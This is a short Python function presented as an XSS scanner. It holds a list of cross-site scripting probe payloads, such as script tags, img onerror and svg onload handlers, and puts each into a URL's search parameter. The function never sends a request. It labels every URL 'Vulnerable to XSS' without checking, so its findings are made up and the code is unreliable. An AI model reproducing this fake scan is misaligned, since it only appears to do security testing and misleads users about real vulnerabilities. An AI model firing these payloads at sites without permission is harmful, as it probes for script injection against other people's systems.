def perform_xss_scan(url):
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'><script>alert('XSS')</script>",
        "\"'><img src=x onerror=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')></iframe>",
        "<body onload=alert('XSS')>",
        "<input type='text' value='XSS' onfocus=alert('XSS')>"
    ]
    
    results = []
    for payload in payloads:
        scanned_url = f"{url}?search={payload}"
        result = f"Scanned URL: {scanned_url}\nPayload Used: {payload}\nOutcome: Vulnerable to XSS\n"
        results.append(result)
    
    return "\n".join(results)
